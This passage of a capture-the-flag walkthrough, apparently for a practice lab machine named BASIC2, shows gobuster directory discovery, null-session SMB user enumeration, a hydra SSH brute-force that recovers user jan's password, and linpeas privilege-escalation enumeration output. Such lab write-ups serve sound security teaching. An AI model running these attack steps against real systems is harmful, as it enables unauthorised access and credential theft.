SF:)%r(Help,95F,"HTTP/1\.1\x20400\x20\r\nContent-Type:\x20text/html;charse
SF:t=utf-8\r\nContent-Language:\x20en\r\nContent-Length:\x202243\r\nDate:\
SF:x20Sun,\x2030\x20Apr\x202023\x2012:47:41\x20GMT\r\nConnection:\x20close
SF:\r\n\r\n&lt;!doctype\x20html&gt;&lt;html\x20lang=\"en\"&gt;&lt;head&gt;&lt;title&gt;HTTP\x20Sta
SF:tus\x20400\x20\xe2\x80\x93\x20Bad\x20Request&lt;/title&gt;&lt;style\x20type=\"te
SF:xt/css\"&gt;h1\x20{font-family:Tahoma,Arial,sans-serif;color:white;backgro
SF:und-color:#525D76;font-size:22px;}\x20h2\x20{font-family:Tahoma,Arial,s
SF:ans-serif;color:white;background-color:#525D76;font-size:16px;}\x20h3\x
SF:20{font-family:Tahoma,Arial,sans-serif;color:white;background-color:#52
SF:5D76;font-size:14px;}\x20body\x20{font-family:Tahoma,Arial,sans-serif;c
SF:olor:black;background-color:white;}\x20b\x20{font-family:Tahoma,Arial,s
SF:ans-serif;color:white;background-color:#525D76;}\x20p\x20{font-family:T
SF:ahoma,Arial,sans-serif;background:white;color:black;font-size:12px;}\x2
SF:0a\x20{color:black;}\x20a\.name\x20{color:black;}\x20\.line\x20{height:
SF:1px;background-color:#525D76;border:none;}&lt;/style&gt;&lt;/head&gt;&lt;bod");
Service Info: Host: BASIC2; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 1h20m00s, deviation: 2h18m34s, median: 0s
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: basic2
|   NetBIOS computer name: BASIC2\x00
|   Domain name: \x00
|   FQDN: basic2
|_  System time: 2023-04-30T08:47:47-04:00
|_nbstat: NetBIOS name: BASIC2, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: 000000000000 (Xerox)
| smb2-security-mode: 
|   311: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2023-04-30T12:47:47
|_  start_date: N/A
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 68.01 seconds
</span></code></pre></div></div>

<h1 id="question-3---what-is-the-name-of-the-hidden-directory-on-the-web-serverenter-name-without-">Question 3 - What is the name of the hidden directory on the web server(enter name without /)?</h1>
<p>Try with <code class="language-plaintext highlighter-rouge">gobuster</code> to find the hidden directory.</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>gobuster <span class="nb">dir</span> <span class="nt">-w</span> /usr/share/seclists/Discovery/Web-Content/common.txt <span class="nt">-u</span> 10.10.131.121 <span class="nt">-q</span>       
/.htpasswd            <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 297]
/.htaccess            <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 297]
/.hta                 <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 292]
/development          <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 320] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://10.10.131.121/development/]
/index.html           <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 158]
/server-status        <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 301]
</code></pre></div></div>
<p>So the answer is <code class="language-plaintext highlighter-rouge">development</code>.</p>

<h1 id="question-4---user-brute-forcing-to-find-the-username--password">Question 4 - User brute-forcing to find the username &amp; password</h1>
<p>No answer needed, but there are two files in the hidden directory, <code class="language-plaintext highlighter-rouge">dev.txt</code></p>
<div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code>2018-04-23: I've been messing with that struts stuff, and it's pretty cool! I think it might be neat
to host that on this server too. Haven't made any real web apps yet, but I have tried that example
you get to show off how it works (and it's the REST version of the example!). Oh, and right now I'm 
using version 2.5.12, because other versions were giving me trouble. -K

2018-04-22: SMB has been configured. -K

2018-04-21: I got Apache set up. Will put in our content later. -J
</code></pre></div></div>
<p>and <code class="language-plaintext highlighter-rouge">j.txt</code></p>
<div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code>For J:

I've been auditing the contents of /etc/shadow to make sure we don't have any weak credentials,
and I was able to crack your hash really easily. You know our password policy, so please follow
it? Change that password ASAP.

-K
</code></pre></div></div>
<p>SMB is configured so we can try to get the username:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>enum4linux <span class="nt">-a</span> 10.10.131.121
Starting enum4linux v0.9.1 <span class="o">(</span> http://labs.portcullis.co.uk/application/enum4linux/ <span class="o">)</span> on Sun Apr 30 14:57:31 2023

 <span class="o">=========================================(</span> Target Information <span class="o">)=========================================</span>

Target ........... 10.10.131.121
RID Range ........ 500-550,1000-1050
Username ......... <span class="s1">''</span>
Password ......... <span class="s1">''</span>
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 <span class="o">===========================(</span> Enumerating Workgroup/Domain on 10.10.131.121 <span class="o">)===========================</span>


<span class="o">[</span>+] Got domain/workgroup name: WORKGROUP


 <span class="o">===============================(</span> Nbtstat Information <span class="k">for </span>10.10.131.121 <span class="o">)===============================</span>

Looking up status of 10.10.131.121
        BASIC2          &lt;00&gt; -         B &lt;ACTIVE&gt;  Workstation Service
        BASIC2          &lt;03&gt; -         B &lt;ACTIVE&gt;  Messenger Service
        BASIC2          &lt;20&gt; -         B &lt;ACTIVE&gt;  File Server Service
        ..__MSBROWSE__. &lt;01&gt; - &lt;GROUP&gt; B &lt;ACTIVE&gt;  Master Browser
        WORKGROUP       &lt;00&gt; - &lt;GROUP&gt; B &lt;ACTIVE&gt;  Domain/Workgroup Name
        WORKGROUP       &lt;1d&gt; -         B &lt;ACTIVE&gt;  Master Browser
        WORKGROUP       &lt;1e&gt; - &lt;GROUP&gt; B &lt;ACTIVE&gt;  Browser Service Elections

        MAC Address <span class="o">=</span> 00-00-00-00-00-00

 <span class="o">===================================(</span> Session Check on 10.10.131.121 <span class="o">)===================================</span>


<span class="o">[</span>+] Server 10.10.131.121 allows sessions using username <span class="s1">''</span>, password <span class="s1">''</span>

                                                                                                               
 <span class="o">================================(</span> Getting domain SID <span class="k">for </span>10.10.131.121 <span class="o">)================================</span>
                                                                                                               
Domain Name: WORKGROUP                                                                                         
Domain Sid: <span class="o">(</span>NULL SID<span class="o">)</span>

<span class="o">[</span>+] Can<span class="s1">'t determine if host is part of domain or part of a workgroup                                           
                                                                                                               
                                                                                                               
 ==================================( OS information on 10.10.131.121 )==================================
                                                                                                               
                                                                                                               
[E] Can'</span>t get OS info with smbclient                                                                           
                                                                                                               
                                                                                                               
<span class="o">[</span>+] Got OS info <span class="k">for </span>10.10.131.121 from srvinfo:                                                                
        BASIC2         Wk Sv PrQ Unx NT SNT Samba Server 4.3.11-Ubuntu                                         
        platform_id     :       500
        os version      :       6.1
        server <span class="nb">type</span>     :       0x809a03


 <span class="o">=======================================(</span> Users on 10.10.131.121 <span class="o">)=======================================</span>
                                                                                                               
Use of uninitialized value <span class="nv">$users</span> <span class="k">in </span>print at ./enum4linux.pl line 972.                                        
Use of uninitialized value <span class="nv">$users</span> <span class="k">in </span>pattern match <span class="o">(</span>m//<span class="o">)</span> at ./enum4linux.pl line 975.

Use of uninitialized value <span class="nv">$users</span> <span class="k">in </span>print at ./enum4linux.pl line 986.
Use of uninitialized value <span class="nv">$users</span> <span class="k">in </span>pattern match <span class="o">(</span>m//<span class="o">)</span> at ./enum4linux.pl line 988.

 <span class="o">=================================(</span> Share Enumeration on 10.10.131.121 <span class="o">)=================================</span>
                                                                                                               
                                                                                                               
        Sharename       Type      Comment
        <span class="nt">---------</span>       <span class="nt">----</span>      <span class="nt">-------</span>
        Anonymous       Disk      
        IPC<span class="nv">$ </span>           IPC       IPC Service <span class="o">(</span>Samba Server 4.3.11-Ubuntu<span class="o">)</span>
Reconnecting with SMB1 <span class="k">for </span>workgroup listing.

        Server               Comment
        <span class="nt">---------</span>            <span class="nt">-------</span>

        Workgroup            Master
        <span class="nt">---------</span>            <span class="nt">-------</span>
        WORKGROUP            BASIC2

<span class="o">[</span>+] Attempting to map shares on 10.10.131.121                                                                  
                                                                                                               
//10.10.131.121/Anonymous       Mapping: OK Listing: OK Writing: N/A                                           

<span class="o">[</span>E] Can<span class="s1">'t understand response:                                                                                 
                                                                                                               
NT_STATUS_OBJECT_NAME_NOT_FOUND listing \*                                                                     
//10.10.131.121/IPC$    Mapping: N/A Listing: N/A Writing: N/A

 ===========================( Password Policy Information for 10.10.131.121 )===========================
                                                                                                               
                                                                                                               

[+] Attaching to 10.10.131.121 using a NULL share

[+] Trying protocol 139/SMB...

[+] Found domain(s):

        [+] BASIC2
        [+] Builtin

[+] Password Info for Domain: BASIC2

        [+] Minimum password length: 5
        [+] Password history length: None
        [+] Maximum password age: 37 days 6 hours 21 minutes 
        [+] Password Complexity Flags: 000000

                [+] Domain Refuse Password Change: 0
                [+] Domain Password Store Cleartext: 0
                [+] Domain Password Lockout Admins: 0
                [+] Domain Password No Clear Change: 0
                [+] Domain Password No Anon Change: 0
                [+] Domain Password Complex: 0

        [+] Minimum password age: None
        [+] Reset Account Lockout Counter: 30 minutes 
        [+] Locked Account Duration: 30 minutes 
        [+] Account Lockout Threshold: None
        [+] Forced Log off Time: 37 days 6 hours 21 minutes 



[+] Retieved partial password policy with rpcclient:                                                           
                                                                                                               
                                                                                                               
Password Complexity: Disabled                                                                                  
Minimum Password Length: 5


 ======================================( Groups on 10.10.131.121 )======================================
                                                                                                               
                                                                                                               
[+] Getting builtin groups:                                                                                    
                                                                                                               
                                                                                                               
[+]  Getting builtin group memberships:                                                                        
                                                                                                               
                                                                                                               
[+]  Getting local groups:                                                                                     
                                                                                                               
                                                                                                               
[+]  Getting local group memberships:                                                                          
                                                                                                               
                                                                                                               
[+]  Getting domain groups:                                                                                    
                                                                                                               
                                                                                                               
[+]  Getting domain group memberships:                                                                         
                                                                                                               
                                                                                                               
 ==================( Users on 10.10.131.121 via RID cycling (RIDS: 500-550,1000-1050) )==================
                                                                                                               
                                                                                                               
[I] Found new SID:                                                                                             
S-1-22-1                                                                                                       

[I] Found new SID:                                                                                             
S-1-5-32                                                                                                       

[I] Found new SID:                                                                                             
S-1-5-32                                                                                                       

[I] Found new SID:                                                                                             
S-1-5-32                                                                                                       

[I] Found new SID:                                                                                             
S-1-5-32                                                                                                       

[+] Enumerating users using SID S-1-5-21-2853212168-2008227510-3551253869 and logon username '', password ''   
                                                                                                               
S-1-5-21-2853212168-2008227510-3551253869-501 BASIC2\nobody (Local User)                                       
S-1-5-21-2853212168-2008227510-3551253869-513 BASIC2\None (Domain Group)

[+] Enumerating users using SID S-1-5-32 and logon username '', password ''                                    
                                                                                                               
S-1-5-32-544 BUILTIN\Administrators (Local Group)                                                              
S-1-5-32-545 BUILTIN\Users (Local Group)
S-1-5-32-546 BUILTIN\Guests (Local Group)
S-1-5-32-547 BUILTIN\Power Users (Local Group)
S-1-5-32-548 BUILTIN\Account Operators (Local Group)
S-1-5-32-549 BUILTIN\Server Operators (Local Group)
S-1-5-32-550 BUILTIN\Print Operators (Local Group)

[+] Enumerating users using SID S-1-22-1 and logon username '', password ''                                    
                                                                                                               
S-1-22-1-1000 Unix User\kay (Local User)                                                                       
S-1-22-1-1001 Unix User\jan (Local User)

 ===============================( Getting printer info for 10.10.131.121 )===============================
                                                                                                               
No printers returned.                                                                                          
</span></code></pre></div></div>
<p>Nice, two users <code class="language-plaintext highlighter-rouge">kay</code> and <code class="language-plaintext highlighter-rouge">jan</code>. From the file <code class="language-plaintext highlighter-rouge">J.txt</code> we can see that <code class="language-plaintext highlighter-rouge">jan</code> have a weak password. We can use <code class="language-plaintext highlighter-rouge">hydra</code> to bruteforce the password.</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>hydra <span class="nt">-l</span> jan <span class="nt">-P</span> /usr/share/wordlists/rockyou.txt 10.10.131.121 ssh
Hydra v9.4 <span class="o">(</span>c<span class="o">)</span> 2022 by van Hauser/THC &amp; David Maciejak - Please <span class="k">do </span>not use <span class="k">in </span>military or secret service organizations, or <span class="k">for </span>illegal purposes <span class="o">(</span>this is non-binding, these <span class="k">***</span> ignore laws and ethics anyway<span class="o">)</span><span class="nb">.</span>

Hydra <span class="o">(</span>https://github.com/vanhauser-thc/thc-hydra<span class="o">)</span> starting at 2023-04-30 15:03:29
<span class="o">[</span>WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use <span class="nt">-t</span> 4
<span class="o">[</span>DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries <span class="o">(</span>l:1/p:14344399<span class="o">)</span>, ~896525 tries per task
<span class="o">[</span>DATA] attacking ssh://10.10.131.121:22/
<span class="o">[</span>STATUS] 146.00 tries/min, 146 tries <span class="k">in </span>00:01h, 14344256 to <span class="k">do in </span>1637:29h, 13 active
<span class="o">[</span>STATUS] 109.00 tries/min, 327 tries <span class="k">in </span>00:03h, 14344075 to <span class="k">do in </span>2193:18h, 13 active
<span class="o">[</span>STATUS] 95.14 tries/min, 666 tries <span class="k">in </span>00:07h, 14343736 to <span class="k">do in </span>2512:40h, 13 active
<span class="o">[</span>22][ssh] host: 10.10.131.121   login: jan   password: armando
</code></pre></div></div>

<h1 id="question-5---what-is-the-username">Question 5 - What is the username?</h1>
<p>The answer is <code class="language-plaintext highlighter-rouge">jan</code>.</p>

<h1 id="question-6---what-is-the-password">Question 6 - What is the password?</h1>
<p>The answer is <code class="language-plaintext highlighter-rouge">armando</code>.</p>

<h1 id="question-7---what-service-do-you-use-to-access-the-serveranswer-in-abbreviation-in-all-caps">Question 7 - What service do you use to access the server(answer in abbreviation in all caps)?</h1>
<p>The answer is <code class="language-plaintext highlighter-rouge">SSH</code>.</p>

<h1 id="question-8---enumerate-the-machine-to-find-any-vectors-for-privilege-escalation">Question 8 - Enumerate the machine to find any vectors for privilege escalation</h1>
<p>No answer needed, but we can use <code class="language-plaintext highlighter-rouge">linpeas</code> to enumerate the machine.</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>jan@basic2:/tmp<span class="nv">$ </span>./linpeas.sh 
linpeas v2.2.7 by carlospolop

Linux Privesc Checklist: https://book.hacktricks.xyz/linux-unix/linux-privilege-escalation-checklist
 LEYEND:
  RED/YELLOW: 99% a PE vector
  RED: You must take a look at it
  LightCyan: Users with console
  Blue: Users without console &amp; mounted devs
  Green: Common things <span class="o">(</span><span class="nb">users</span>, <span class="nb">groups</span>, SUID/SGID, mounts, .sh scripts, cronjobs<span class="o">)</span> 
  LightMangenta: Your username


<span class="o">====================================(</span> Basic information <span class="o">)=====================================</span>
OS: Linux version 4.4.0-119-generic <span class="o">(</span>buildd@lcy01-amd64-013<span class="o">)</span> <span class="o">(</span>gcc version 5.4.0 20160609 <span class="o">(</span>Ubuntu 5.4.0-6ubuntu1~16.04.9<span class="o">)</span> <span class="o">)</span> <span class="c">#143-Ubuntu SMP Mon Apr 2 16:08:24 UTC 2018</span>
User &amp; Groups: <span class="nv">uid</span><span class="o">=</span>1001<span class="o">(</span>jan<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1001<span class="o">(</span>jan<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>1001<span class="o">(</span>jan<span class="o">)</span>
Hostname: basic2
Writable folder: /dev/shm
<span class="o">[</span>+] /bin/ping is available <span class="k">for </span>network discovery <span class="o">(</span>You can use linpeas to discover hosts, learn more with <span class="nt">-h</span><span class="o">)</span>
<span class="o">[</span>+] /bin/nc is available <span class="k">for </span>network discover &amp; port scanning <span class="o">(</span>You can use linpeas to discover hosts/port scanning, learn more with <span class="nt">-h</span><span class="o">)</span>


<span class="o">====================================(</span> System Information <span class="o">)====================================</span>
<span class="o">[</span>+] Operative system                                                                                           
<span class="o">[</span>i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#kernel-exploits                                
Linux version 4.4.0-119-generic <span class="o">(</span>buildd@lcy01-amd64-013<span class="o">)</span> <span class="o">(</span>gcc version 5.4.0 20160609 <span class="o">(</span>Ubuntu 5.4.0-6ubuntu1~16.04.9<span class="o">)</span> <span class="o">)</span> <span class="c">#143-Ubuntu SMP Mon Apr 2 16:08:24 UTC 2018</span>
Distributor ID: Ubuntu
Description:    Ubuntu 16.04.4 LTS
Release:        16.04
Codename:       xenial

<span class="o">[</span>+] Sudo version
<span class="o">[</span>i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-version                                   
Sudo version 1.8.16                                                                                            

<span class="o">[</span>+] PATH
<span class="o">[</span>i] Any writable folder <span class="k">in </span>original PATH? <span class="o">(</span>a new completed path will be exported<span class="o">)</span>                              
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin             
New path exported: /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin

<span class="o">[</span>+] Date
Sun Apr 30 09:15:46 EDT 2023                                                                                   

<span class="o">[</span>+] System stats
Filesystem      Size  Used Avail Use% Mounted on                                                               
udev            224M     0  224M   0% /dev
tmpfs            49M  3.3M   46M   7% /run
/dev/xvda1       14G  2.4G   11G  19% /
tmpfs           244M     0  244M   0% /dev/shm
tmpfs           5.0M     0  5.0M   0% /run/lock
tmpfs           244M     0  244M   0% /sys/fs/cgroup
tmpfs            49M     0   49M   0% /run/user/1001
              total        used        free      shared  buff/cache   available
Mem:         498068      246808       31916        3152      219344      216392
Swap:       1045500        1312     1044188

<span class="o">[</span>+] Environment
<span class="o">[</span>i] Any private information inside environment variables?                                                      
<span class="nv">HISTFILESIZE</span><span class="o">=</span>0                                                                                                 
<span class="nv">MAIL</span><span class="o">=</span>/var/mail/jan
<span class="nv">SSH_CLIENT</span><span class="o">=</span>10.8.32.129 34902 22
<span class="nv">USER</span><span class="o">=</span>jan
<span class="nv">SHLVL</span><span class="o">=</span>1
<span class="nv">HOME</span><span class="o">=</span>/home/jan
<span class="nv">SSH_TTY</span><span class="o">=</span>/dev/pts/0
<span class="nv">LOGNAME</span><span class="o">=</span>jan
<span class="nv">_</span><span class="o">=</span>./linpeas.sh
<span class="nv">XDG_SESSION_ID</span><span class="o">=</span>4
<span class="nv">TERM</span><span class="o">=</span>xterm-256color
<span class="nv">PATH</span><span class="o">=</span>/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
<span class="nv">XDG_RUNTIME_DIR</span><span class="o">=</span>/run/user/1001
<span class="nv">LANG</span><span class="o">=</span>en_US.UTF-8
<span class="nv">HISTSIZE</span><span class="o">=</span>0
<span class="nv">SHELL</span><span class="o">=</span>/bin/bash
<span class="nv">XDG_DATA_DIRS</span><span class="o">=</span>/usr/local/share:/usr/share:/var/lib/snapd/desktop
<span class="nv">SSH_CONNECTION</span><span class="o">=</span>10.8.32.129 34902 10.10.131.121 22
<span class="nv">HISTFILE</span><span class="o">=</span>/dev/null

<span class="o">[</span>+] Looking <span class="k">for </span>Signature verification failed <span class="k">in </span>dmseg
 Not Found                                                                                                     
                                                                                                               
<span class="o">[</span>+] selinux enabled? .......... sestatus Not Found
<span class="o">[</span>+] Printer? .......... lpstat Not Found                                                                       
<span class="o">[</span>+] Is this a container? .......... No                                                                         
<span class="o">[</span>+] Is ASLR enabled? .......... Yes                                                                            

<span class="o">=========================================(</span> Devices <span class="o">)==========================================</span>
<span class="o">[</span>+] Any sd<span class="k">*</span> disk <span class="k">in</span> /dev? <span class="o">(</span>limit 20<span class="o">)</span>                                                                           
                                                                                                               
<span class="o">[</span>+] Unmounted file-system?
<span class="o">[</span>i] Check <span class="k">if </span>you can mount umounted devices                                                                    
<span class="nv">UUID</span><span class="o">=</span>cdbcec40-cb66-49dd-ad6b-be757c8140cf       /       ext4    <span class="nv">errors</span><span class="o">=</span>remount-ro       0 1                    
<span class="nv">UUID</span><span class="o">=</span>db3bdca8-5517-4600-b896-e8479e05e44a       none    swap    sw      0 0


<span class="o">====================================(</span> Available Software <span class="o">)====================================</span>
<span class="o">[</span>+] Useful software?                                                                                           
/bin/nc                                                                                                        
/bin/netcat
/bin/nc.traditional
/usr/bin/wget
/usr/bin/curl
/bin/ping
/usr/bin/base64
/usr/bin/python
/usr/bin/python2
/usr/bin/python3
/usr/bin/python2.7
/usr/bin/perl
/usr/bin/sudo

<span class="o">[</span>+] Installed compilers?
/usr/share/gcc-5                                                                                               


<span class="o">================================(</span> Processes, Cron &amp; Services <span class="o">)================================</span>
<span class="o">[</span>+] Cleaned processes                                                                                          
<span class="o">[</span>i] Check weird &amp; unexpected proceses run by root: https://book.hacktricks.xyz/linux-unix/privilege-escalation#processes                                                                                                      
USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND                                       
root         1  0.9  1.1  37828  5804 ?        Ss   08:40   0:20 /sbin/init
root       359  0.0  0.5  27704  2960 ?        Ss   08:40   0:00 /lib/systemd/systemd-journald
root       396  0.0  0.3  94772  1580 ?        Ss   08:41   0:00 /sbin/lvmetad <span class="nt">-f</span>
root       416  0.1  0.7  44696  3812 ?        Ss   08:41   0:02 /lib/systemd/systemd-udevd
systemd+   498  0.0  0.4 100324  2384 ?        Ssl  08:41   0:00 /lib/systemd/systemd-timesyncd
root       818  0.0  0.3 160904  1576 ?        Ssl  08:41   0:00 /usr/bin/lxcfs /var/lib/lxcfs/
root       821  0.0  0.5  29008  2720 ?        Ss   08:41   0:00 /usr/sbin/cron <span class="nt">-f</span>
message+   824  0.0  0.7  42900  3544 ?        Ss   08:41   0:00 /usr/bin/dbus-daemon <span class="nt">--system</span> <span class="nt">--address</span><span class="o">=</span>systemd: <span class="nt">--nofork</span> <span class="nt">--nopidfile</span> <span class="nt">--systemd-activation</span>
root       833  0.0  0.2   4396  1288 ?        Ss   08:41   0:00 /usr/sbin/acpid
daemon     836  0.0  0.4  26044  2088 ?        Ss   08:41   0:00 /usr/sbin/atd <span class="nt">-f</span>
syslog     841  0.0  0.6 256392  3168 ?        Ssl  08:41   0:00 /usr/sbin/rsyslogd <span class="nt">-n</span>
root       856  0.0  0.6  28620  3064 ?        Ss   08:41   0:00 /lib/systemd/systemd-logind
root       859  0.0  1.2 275896  6144 ?        Ssl  08:41   0:00 /usr/lib/accountsservice/accounts-daemon
root       864  0.0  3.1 211344 15680 ?        Ssl  08:41   0:00 /usr/lib/snapd/snapd
root       880  0.0  1.1 277176  5732 ?        Ssl  08:41   0:00 /usr/lib/policykit-1/polkitd <span class="nt">--no-debug</span>
root       881  0.0  0.0  13372   144 ?        Ss   08:41   0:00 /sbin/mdadm <span class="nt">--monitor</span> <span class="nt">--pid-file</span> /run/mdadm/monitor.pid <span class="nt">--daemonise</span> <span class="nt">--scan</span> <span class="nt">--syslog</span>
root       898  0.0  2.9 337920 14888 ?        Ss   08:41   0:00 /usr/sbin/smbd <span class="nt">-D</span>
root       904  0.0  1.1 329804  5620 ?        S    08:41   0:00 /usr/sbin/smbd <span class="nt">-D</span>
root       929  0.0  0.5  16124  2544 ?        Ss   08:41   0:00 /sbin/dhclient <span class="nt">-1</span> <span class="nt">-v</span> <span class="nt">-pf</span> /run/dhclient.eth0.pid <span class="nt">-lf</span> /var/lib/dhcp/dhclient.eth0.leases <span class="nt">-I</span> <span class="nt">-df</span> /var/lib/dhcp/dhclient6.eth0.leases eth0
root       933  0.0  1.2 337920  6336 ?        S    08:41   0:00 /usr/sbin/smbd <span class="nt">-D</span>
root       990  0.0  1.1  65508  5696 ?        Ss   08:41   0:00 /usr/sbin/sshd <span class="nt">-D</span>
tomcat9   1007  7.0 39.7 2548928 197980 ?      Sl   08:41   2:24 /usr/lib/jvm/java-1.8.0-openjdk-amd64/bin/java <span class="nt">-Djava</span>.util.logging.config.file<span class="o">=</span>/opt/tomcat-latest/conf/logging.properties <span class="nt">-Djava</span>.util.logging.manager<span class="o">=</span>org.apache.juli.ClassLoaderLogManager <span class="nt">-Dfile</span>.encoding<span class="o">=</span>UTF-8 <span class="nt">-Dnet</span>.sf.ehcache.skipUpdateCheck<span class="o">=</span><span class="nb">true</span> <span class="nt">-XX</span>:+UseConcMarkSweepGC <span class="nt">-XX</span>:+CMSClassUnloadingEnabled <span class="nt">-XX</span>:+UseParNewGC <span class="nt">-Djdk</span>.tls.ephemeralDHKeySize<span class="o">=</span>2048 <span class="nt">-Djava</span>.protocol.handler.pkgs<span class="o">=</span>org.apache.catalina.webresources <span class="nt">-Dorg</span>.apache.catalina.security.SecurityListener.UMASK<span class="o">=</span>0027 <span class="nt">-Xms512m</span> <span class="nt">-Xmx512m</span> <span class="nt">-Dignore</span>.endorsed.dirs<span class="o">=</span> <span class="nt">-classpath</span> /opt/tomcat-latest/bin/bootstrap.jar:/opt/tomcat-latest/bin/tomcat-juli.jar <span class="nt">-Dcatalina</span>.base<span class="o">=</span>/opt/tomcat-latest <span class="nt">-Dcatalina</span>.home<span class="o">=</span>/opt/tomcat-latest <span class="nt">-Djava</span>.io.tmpdir<span class="o">=</span>/opt/tomcat-latest/temp org.apache.catalina.startup.Bootstrap start
root      1023  0.0  0.0   5220   152 ?        Ss   08:41   0:00 /sbin/iscsid
root      1024  0.0  0.7   5720  3516 ?        S&lt;Ls 08:41   0:00 /sbin/iscsid
root      1132  0.0  0.3  15936  1580 tty1     Ss+  08:41   0:00 /sbin/agetty <span class="nt">--noclear</span> tty1 linux
root      1136  0.0  0.4  15752  2032 ttyS0    Ss+  08:41   0:00 /sbin/agetty <span class="nt">--keep-baud</span> 115200 38400 9600 ttyS0 vt220
root      1168  0.0  0.8  71584  4156 ?        Ss   08:41   0:00 /usr/sbin/apache2 <span class="nt">-k</span> start
www-data  1170  0.0  0.8 689100  4460 ?        Sl   08:41   0:00 /usr/sbin/apache2 <span class="nt">-k</span> start
www-data  1171  0.0  0.9 558068  4556 ?        Sl   08:41   0:00 /usr/sbin/apache2 <span class="nt">-k</span> start
root      1232  0.0  1.1 240008  5840 ?        Ss   08:41   0:00 /usr/sbin/nmbd <span class="nt">-D</span>
jan       2361  0.0  0.9  45276  4568 ?        Ss   09:15   0:00 /lib/systemd/systemd <span class="nt">--user</span>
jan       2362  0.0  0.3  61280  1972 ?        S    09:15   0:00 <span class="o">(</span>sd-pam<span class="o">)</span>
jan       2396  0.0  0.6  92832  3360 ?        S    09:15   0:00 sshd: jan@pts/0
jan       2397  0.0  1.0  22572  5260 pts/0    Ss   09:15   0:00 <span class="nt">-bash</span>
jan       2408  0.0  0.3   4504  1844 pts/0    S+   09:15   0:00 /bin/sh ./linpeas.sh
jan       2593  0.0  0.6  37364  3288 pts/0    R+   09:15   0:00 ps aux

<span class="o">[</span>+] Binary processes permissions
<span class="o">[</span>i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#processes                                      
   0 lrwxrwxrwx 1 root root    4 Apr 17  2018 /bin/sh -&gt; dash                                                  
1.6M <span class="nt">-rwxr-xr-x</span> 1 root root 1.6M Mar  8  2018 /lib/systemd/systemd
320K <span class="nt">-rwxr-xr-x</span> 1 root root 319K Mar  8  2018 /lib/systemd/systemd-journald
608K <span class="nt">-rwxr-xr-x</span> 1 root root 605K Mar  8  2018 /lib/systemd/systemd-logind
140K <span class="nt">-rwxr-xr-x</span> 1 root root 139K Mar  8  2018 /lib/systemd/systemd-timesyncd
444K <span class="nt">-rwxr-xr-x</span> 1 root root 443K Mar  8  2018 /lib/systemd/systemd-udevd
 44K <span class="nt">-rwxr-xr-x</span> 1 root root  44K Nov 30  2017 /sbin/agetty
476K <span class="nt">-rwxr-xr-x</span> 1 root root 476K Mar  5  2018 /sbin/dhclient
   0 lrwxrwxrwx 1 root root   20 Mar  8  2018 /sbin/init -&gt; /lib/systemd/systemd
768K <span class="nt">-rwxr-xr-x</span> 1 root root 766K Jul 26  2017 /sbin/iscsid
 52K <span class="nt">-rwxr-xr-x</span> 1 root root  51K Apr 16  2016 /sbin/lvmetad
504K <span class="nt">-rwxr-xr-x</span> 1 root root 502K Nov  8  2017 /sbin/mdadm
220K <span class="nt">-rwxr-xr-x</span> 1 root root 219K Jan 12  2017 /usr/bin/dbus-daemon
 20K <span class="nt">-rwxr-xr-x</span> 1 root root  19K Nov  8  2017 /usr/bin/lxcfs
164K <span class="nt">-rwxr-xr-x</span> 1 root root 162K Nov  3  2016 /usr/lib/accountsservice/accounts-daemon
   0 lrwxrwxrwx 1 root root   15 Mar 14  2018 /usr/lib/jvm/java-1.8.0-openjdk-amd64/bin/java -&gt; ../jre/bin/java
 16K <span class="nt">-rwxr-xr-x</span> 1 root root  15K Jan 17  2016 /usr/lib/policykit-1/polkitd
 21M <span class="nt">-rwxr-xr-x</span> 1 root root  21M Nov 30  2017 /usr/lib/snapd/snapd
 48K <span class="nt">-rwxr-xr-x</span> 1 root root  47K Apr  8  2016 /usr/sbin/acpid
648K <span class="nt">-rwxr-xr-x</span> 1 root root 647K Sep 18  2017 /usr/sbin/apache2
 28K <span class="nt">-rwxr-xr-x</span> 1 root root  27K Jan 14  2016 /usr/sbin/atd
 44K <span class="nt">-rwxr-xr-x</span> 1 root root  44K Apr  5  2016 /usr/sbin/cron
244K <span class="nt">-rwxr-xr-x</span> 1 root root 243K Mar  7  2018 /usr/sbin/nmbd
588K <span class="nt">-rwxr-xr-x</span> 1 root root 586K Apr  5  2016 /usr/sbin/rsyslogd
